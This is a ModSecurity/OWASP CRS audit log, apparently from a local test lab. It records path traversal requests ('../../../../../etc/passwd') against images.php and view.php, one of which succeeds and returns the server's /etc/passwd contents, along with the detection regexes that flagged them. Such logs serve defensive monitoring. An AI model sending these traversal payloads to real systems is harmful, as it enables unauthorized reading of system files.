                <img src="images/red_vineyards.jpg" alt="image3" class="img-fluid rounded">
                <p class="text-center mt-3">red_vineyards.jpg</p>
            </div>
        </div>
    </div>
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
</body>

</html>
--c630e167-H--
Message: Warning. Pattern match "^[\\d.:]+$" at REQUEST_HEADERS:Host. [file "/usr/share/modsecurity-crs/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"] [line "736"] [id "920350"] [msg "Host header is a numeric IP address"] [data "127.0.0.1:9090"] [severity "WARNING"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-protocol"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/210/272"] [tag "PCI/6.5.10"]
Message: Warning. Pattern match "(?i)(?:\\x5c|(?:%(?:c(?:0%(?:[2aq]f|5c|9v)|1%(?:[19p]c|8s|af))|2(?:5(?:c(?:0%25af|1%259c)|2f|5c)|%46|f)|(?:(?:f(?:8%8)?0%8|e)0%80%a|bg%q)f|%3(?:2(?:%(?:%6|4)6|F)|5%%63)|u(?:221[56]|002f|EFC8|F025)|1u|5c)|0x(?:2f|5c)|\\/))(?:%(?:(?:f(?:(?:c%80|8)%8)?0%8 ..." at REQUEST_URI_RAW. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "48"] [id "930100"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: %2F..%2F found within REQUEST_URI_RAW: /images.php?file=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"]
Message: Warning. Pattern match "(?i)(?:\\x5c|(?:%(?:c(?:0%(?:[2aq]f|5c|9v)|1%(?:[19p]c|8s|af))|2(?:5(?:c(?:0%25af|1%259c)|2f|5c)|%46|f)|(?:(?:f(?:8%8)?0%8|e)0%80%a|bg%q)f|%3(?:2(?:%(?:%6|4)6|F)|5%%63)|u(?:221[56]|002f|EFC8|F025)|1u|5c)|0x(?:2f|5c)|\\/))(?:%(?:(?:f(?:(?:c%80|8)%8)?0%8 ..." at ARGS:file. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "48"] [id "930100"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within ARGS:file: ../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"]
Message: Warning. Pattern match "(?:^|[\\/])\\.\\.(?:[\\/]|$)" at REQUEST_URI. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "72"] [id "930110"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within REQUEST_URI: /images.php?file=../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"]
Message: Warning. Pattern match "(?:^|[\\/])\\.\\.(?:[\\/]|$)" at REQUEST_URI. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "72"] [id "930110"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within REQUEST_URI: /images.php?file=../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"]
Message: Warning. Pattern match "(?:^|[\\/])\\.\\.(?:[\\/]|$)" at ARGS:file. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "72"] [id "930110"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: ../ found within ARGS:file: ../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"]
Message: Warning. Pattern match "(?:^|[\\/])\\.\\.(?:[\\/]|$)" at ARGS:file. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "72"] [id "930110"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: ../ found within ARGS:file: ../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"]
Message: Warning. Matched phrase "etc/passwd" at ARGS:file. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "98"] [id "930120"] [msg "OS File Access Attempt"] [data "Matched Data: etc/passwd found within ARGS:file: ../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"] [tag "PCI/6.5.4"]
Message: Warning. Matched phrase "etc/passwd" at ARGS:file. [file "/usr/share/modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"] [line "501"] [id "932160"] [msg "Remote Command Execution: Unix Shell Code Found"] [data "Matched Data: etc/passwd found within ARGS:file: ../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-shell"] [tag "platform-unix"] [tag "attack-rce"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/152/248/88"] [tag "PCI/6.5.2"]
Message: Warning. Operator GE matched 5 at TX:anomaly_score. [file "/usr/share/modsecurity-crs/rules/REQUEST-949-BLOCKING-EVALUATION.conf"] [line "94"] [id "949110"] [msg "Inbound Anomaly Score Exceeded (Total Score: 43)"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-generic"]
Message: Warning. Operator GE matched 5 at TX:inbound_anomaly_score. [file "/usr/share/modsecurity-crs/rules/RESPONSE-980-CORRELATION.conf"] [line "92"] [id "980130"] [msg "Inbound Anomaly Score Exceeded (Total Inbound Score: 43 - SQLI=0,XSS=0,RFI=0,LFI=35,RCE=5,PHPI=0,HTTP=0,SESS=0): individual paranoia level scores: 43, 0, 0, 0"] [ver "OWASP_CRS/3.3.5"] [tag "event-correlation"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Pattern match "^[\\\\\\\\d.:]+$" at REQUEST_HEADERS:Host. [file "/usr/share/modsecurity-crs/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"] [line "736"] [id "920350"] [msg "Host header is a numeric IP address"] [data "127.0.0.1:9090"] [severity "WARNING"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-protocol"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/210/272"] [tag "PCI/6.5.10"] [hostname "127.0.0.1"] [uri "/images.php"] [unique_id "aVzWNmLm1Ko6nAjfB6CuegAAAAU"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Pattern match "(?i)(?:\\\\\\\\x5c|(?:%(?:c(?:0%(?:[2aq]f|5c|9v)|1%(?:[19p]c|8s|af))|2(?:5(?:c(?:0%25af|1%259c)|2f|5c)|%46|f)|(?:(?:f(?:8%8)?0%8|e)0%80%a|bg%q)f|%3(?:2(?:%(?:%6|4)6|F)|5%%63)|u(?:221[56]|002f|EFC8|F025)|1u|5c)|0x(?:2f|5c)|\\\\\\\\/))(?:%(?:(?:f(?:(?:c%80|8)%8)?0%8 ..." at REQUEST_URI_RAW. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "48"] [id "930100"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: %2F..%2F found within REQUEST_URI_RAW: /images.php?file=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"] [hostname "127.0.0.1"] [uri "/images.php"] [unique_id "aVzWNmLm1Ko6nAjfB6CuegAAAAU"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Pattern match "(?i)(?:\\\\\\\\x5c|(?:%(?:c(?:0%(?:[2aq]f|5c|9v)|1%(?:[19p]c|8s|af))|2(?:5(?:c(?:0%25af|1%259c)|2f|5c)|%46|f)|(?:(?:f(?:8%8)?0%8|e)0%80%a|bg%q)f|%3(?:2(?:%(?:%6|4)6|F)|5%%63)|u(?:221[56]|002f|EFC8|F025)|1u|5c)|0x(?:2f|5c)|\\\\\\\\/))(?:%(?:(?:f(?:(?:c%80|8)%8)?0%8 ..." at ARGS:file. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "48"] [id "930100"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within ARGS:file: ../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"] [hostname "127.0.0.1"] [uri "/images.php"] [unique_id "aVzWNmLm1Ko6nAjfB6CuegAAAAU"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Pattern match "(?:^|[\\\\\\\\/])\\\\\\\\.\\\\\\\\.(?:[\\\\\\\\/]|$)" at REQUEST_URI. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "72"] [id "930110"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within REQUEST_URI: /images.php?file=../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"] [hostname "127.0.0.1"] [uri "/images.php"] [unique_id "aVzWNmLm1Ko6nAjfB6CuegAAAAU"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Pattern match "(?:^|[\\\\\\\\/])\\\\\\\\.\\\\\\\\.(?:[\\\\\\\\/]|$)" at REQUEST_URI. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "72"] [id "930110"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within REQUEST_URI: /images.php?file=../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"] [hostname "127.0.0.1"] [uri "/images.php"] [unique_id "aVzWNmLm1Ko6nAjfB6CuegAAAAU"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Pattern match "(?:^|[\\\\\\\\/])\\\\\\\\.\\\\\\\\.(?:[\\\\\\\\/]|$)" at ARGS:file. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "72"] [id "930110"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: ../ found within ARGS:file: ../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"] [hostname "127.0.0.1"] [uri "/images.php"] [unique_id "aVzWNmLm1Ko6nAjfB6CuegAAAAU"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Pattern match "(?:^|[\\\\\\\\/])\\\\\\\\.\\\\\\\\.(?:[\\\\\\\\/]|$)" at ARGS:file. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "72"] [id "930110"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: ../ found within ARGS:file: ../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"] [hostname "127.0.0.1"] [uri "/images.php"] [unique_id "aVzWNmLm1Ko6nAjfB6CuegAAAAU"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Matched phrase "etc/passwd" at ARGS:file. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "98"] [id "930120"] [msg "OS File Access Attempt"] [data "Matched Data: etc/passwd found within ARGS:file: ../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"] [tag "PCI/6.5.4"] [hostname "127.0.0.1"] [uri "/images.php"] [unique_id "aVzWNmLm1Ko6nAjfB6CuegAAAAU"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Matched phrase "etc/passwd" at ARGS:file. [file "/usr/share/modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"] [line "501"] [id "932160"] [msg "Remote Command Execution: Unix Shell Code Found"] [data "Matched Data: etc/passwd found within ARGS:file: ../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-shell"] [tag "platform-unix"] [tag "attack-rce"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/152/248/88"] [tag "PCI/6.5.2"] [hostname "127.0.0.1"] [uri "/images.php"] [unique_id "aVzWNmLm1Ko6nAjfB6CuegAAAAU"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Operator GE matched 5 at TX:anomaly_score. [file "/usr/share/modsecurity-crs/rules/REQUEST-949-BLOCKING-EVALUATION.conf"] [line "94"] [id "949110"] [msg "Inbound Anomaly Score Exceeded (Total Score: 43)"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-generic"] [hostname "127.0.0.1"] [uri "/images.php"] [unique_id "aVzWNmLm1Ko6nAjfB6CuegAAAAU"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Operator GE matched 5 at TX:inbound_anomaly_score. [file "/usr/share/modsecurity-crs/rules/RESPONSE-980-CORRELATION.conf"] [line "92"] [id "980130"] [msg "Inbound Anomaly Score Exceeded (Total Inbound Score: 43 - SQLI=0,XSS=0,RFI=0,LFI=35,RCE=5,PHPI=0,HTTP=0,SESS=0): individual paranoia level scores: 43, 0, 0, 0"] [ver "OWASP_CRS/3.3.5"] [tag "event-correlation"] [hostname "127.0.0.1"] [uri "/images.php"] [unique_id "aVzWNmLm1Ko6nAjfB6CuegAAAAU"]
Apache-Handler: application/x-httpd-php
Stopwatch: 1767691830015500 4942 (- - -)
Stopwatch2: 1767691830015500 4942; combined=3106, p1=787, p2=1756, p3=29, p4=378, p5=156, sr=114, sw=0, l=0, gc=0
Response-Body-Transformed: Dechunked
Producer: ModSecurity for Apache/2.9.7 (http://www.modsecurity.org/); OWASP_CRS/3.3.5.
Server: Apache/2.4.58 (Ubuntu)
Engine-Mode: "DETECTION_ONLY"

--c630e167-Z--

--49e1f51a-A--
[06/Jan/2026:14:30:30.026921 +0500] aVzWNmLm1Ko6nAjfB6CuewAAAAU 172.17.0.1 47440 172.17.0.2 80
--49e1f51a-B--
GET /view.php?image=../../../../../etc/passwd HTTP/1.1
Host: 127.0.0.1:9090
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
sec-ch-ua: "Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Referer: http://127.0.0.1:9090/images.php
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6

--49e1f51a-F--
HTTP/1.1 200 OK
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 381
Keep-Alive: timeout=5, max=99
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

--49e1f51a-E--
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
mysql:x:100:101:MySQL Server,,,:/nonexistent:/bin/false

--49e1f51a-H--
Message: Warning. Pattern match "^[\\d.:]+$" at REQUEST_HEADERS:Host. [file "/usr/share/modsecurity-crs/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"] [line "736"] [id "920350"] [msg "Host header is a numeric IP address"] [data "127.0.0.1:9090"] [severity "WARNING"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-protocol"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/210/272"] [tag "PCI/6.5.10"]
Message: Warning. Pattern match "(?i)(?:\\x5c|(?:%(?:c(?:0%(?:[2aq]f|5c|9v)|1%(?:[19p]c|8s|af))|2(?:5(?:c(?:0%25af|1%259c)|2f|5c)|%46|f)|(?:(?:f(?:8%8)?0%8|e)0%80%a|bg%q)f|%3(?:2(?:%(?:%6|4)6|F)|5%%63)|u(?:221[56]|002f|EFC8|F025)|1u|5c)|0x(?:2f|5c)|\\/))(?:%(?:(?:f(?:(?:c%80|8)%8)?0%8 ..." at REQUEST_URI_RAW. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "48"] [id "930100"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within REQUEST_URI_RAW: /view.php?image=../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"]
Message: Warning. Pattern match "(?i)(?:\\x5c|(?:%(?:c(?:0%(?:[2aq]f|5c|9v)|1%(?:[19p]c|8s|af))|2(?:5(?:c(?:0%25af|1%259c)|2f|5c)|%46|f)|(?:(?:f(?:8%8)?0%8|e)0%80%a|bg%q)f|%3(?:2(?:%(?:%6|4)6|F)|5%%63)|u(?:221[56]|002f|EFC8|F025)|1u|5c)|0x(?:2f|5c)|\\/))(?:%(?:(?:f(?:(?:c%80|8)%8)?0%8 ..." at ARGS:image. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "48"] [id "930100"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within ARGS:image: ../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"]
Message: Warning. Pattern match "(?:^|[\\/])\\.\\.(?:[\\/]|$)" at REQUEST_URI. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "72"] [id "930110"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within REQUEST_URI: /view.php?image=../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"]
Message: Warning. Pattern match "(?:^|[\\/])\\.\\.(?:[\\/]|$)" at REQUEST_URI. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "72"] [id "930110"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within REQUEST_URI: /view.php?image=../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"]
Message: Warning. Pattern match "(?:^|[\\/])\\.\\.(?:[\\/]|$)" at ARGS:image. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "72"] [id "930110"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: ../ found within ARGS:image: ../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"]
Message: Warning. Pattern match "(?:^|[\\/])\\.\\.(?:[\\/]|$)" at ARGS:image. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "72"] [id "930110"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: ../ found within ARGS:image: ../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"]
Message: Warning. Matched phrase "etc/passwd" at ARGS:image. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "98"] [id "930120"] [msg "OS File Access Attempt"] [data "Matched Data: etc/passwd found within ARGS:image: ../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"] [tag "PCI/6.5.4"]
Message: Warning. Matched phrase "etc/passwd" at ARGS:image. [file "/usr/share/modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"] [line "501"] [id "932160"] [msg "Remote Command Execution: Unix Shell Code Found"] [data "Matched Data: etc/passwd found within ARGS:image: ../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-shell"] [tag "platform-unix"] [tag "attack-rce"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/152/248/88"] [tag "PCI/6.5.2"]
Message: Warning. Operator GE matched 5 at TX:anomaly_score. [file "/usr/share/modsecurity-crs/rules/REQUEST-949-BLOCKING-EVALUATION.conf"] [line "94"] [id "949110"] [msg "Inbound Anomaly Score Exceeded (Total Score: 43)"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-generic"]
Message: Warning. Operator GE matched 5 at TX:inbound_anomaly_score. [file "/usr/share/modsecurity-crs/rules/RESPONSE-980-CORRELATION.conf"] [line "92"] [id "980130"] [msg "Inbound Anomaly Score Exceeded (Total Inbound Score: 43 - SQLI=0,XSS=0,RFI=0,LFI=35,RCE=5,PHPI=0,HTTP=0,SESS=0): individual paranoia level scores: 43, 0, 0, 0"] [ver "OWASP_CRS/3.3.5"] [tag "event-correlation"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Pattern match "^[\\\\\\\\d.:]+$" at REQUEST_HEADERS:Host. [file "/usr/share/modsecurity-crs/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"] [line "736"] [id "920350"] [msg "Host header is a numeric IP address"] [data "127.0.0.1:9090"] [severity "WARNING"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-protocol"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/210/272"] [tag "PCI/6.5.10"] [hostname "127.0.0.1"] [uri "/view.php"] [unique_id "aVzWNmLm1Ko6nAjfB6CuewAAAAU"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Pattern match "(?i)(?:\\\\\\\\x5c|(?:%(?:c(?:0%(?:[2aq]f|5c|9v)|1%(?:[19p]c|8s|af))|2(?:5(?:c(?:0%25af|1%259c)|2f|5c)|%46|f)|(?:(?:f(?:8%8)?0%8|e)0%80%a|bg%q)f|%3(?:2(?:%(?:%6|4)6|F)|5%%63)|u(?:221[56]|002f|EFC8|F025)|1u|5c)|0x(?:2f|5c)|\\\\\\\\/))(?:%(?:(?:f(?:(?:c%80|8)%8)?0%8 ..." at REQUEST_URI_RAW. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "48"] [id "930100"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within REQUEST_URI_RAW: /view.php?image=../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"] [hostname "127.0.0.1"] [uri "/view.php"] [unique_id "aVzWNmLm1Ko6nAjfB6CuewAAAAU"]
